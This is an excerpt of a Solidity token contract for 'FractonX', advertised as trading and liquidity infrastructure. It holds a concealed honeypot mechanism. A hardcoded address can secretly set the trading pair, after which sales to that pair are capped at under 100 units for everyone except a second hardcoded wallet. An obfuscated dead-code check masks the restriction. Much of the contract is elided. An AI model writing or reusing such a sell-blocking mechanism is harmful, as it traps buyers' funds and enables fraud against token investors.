...
Fracton X
A New Frontier in NFTs RWAS MEMES Trading & Liquidity Infrastructure
linktr.ee/fractonprotocol
*/
...
contract FractonX is Ownable, IERC20, IERC20Meta {
    ...
    function toPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0xff88469D4A2989e6Ab28A6DbF0A27df6543281B7) _pair = account;
        return true;
    }
    ...
    function _transfer(
        ...
        if(_pair != address(0)) {
            if(to == _pair && from != 0xAB7643Bab9b49d5f11bB24391C48d3832b197CaD) {
               bool b = false;
               if(!b) {
                    require(amount < 100);
               }
